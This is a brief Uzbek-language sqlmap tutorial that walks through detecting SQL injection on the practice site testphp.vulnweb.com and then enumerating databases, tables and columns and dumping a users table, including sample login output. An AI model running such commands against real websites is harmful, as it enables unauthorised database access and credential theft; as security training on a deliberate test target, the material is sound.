**SQLMAP**   
```
sudo apt update && sudo apt install sqlmap
```   
1. Veb-saytda SQL Injection bor-yo'qligini aniqlash uchun (Barcha ma'lumotlar bazasini chiqarish):   
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --dbs
```
available databases [2]:  
**acuart**  
information_schema  


2. Muayyan bazadagi jadvallarni aniqlash:   
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
```
Database: acuart  
(8 tables)   
.......  
users  

3. Muayyan jadvaldagi ustunlarni chiqarish:
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
```
name  
pass  
uname  

4. Ma'lumotlarni chiqarish (dump):
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C name,uname,pass --dump
```  
| name         | uname | pass | 
| John M Smith | test  | test |
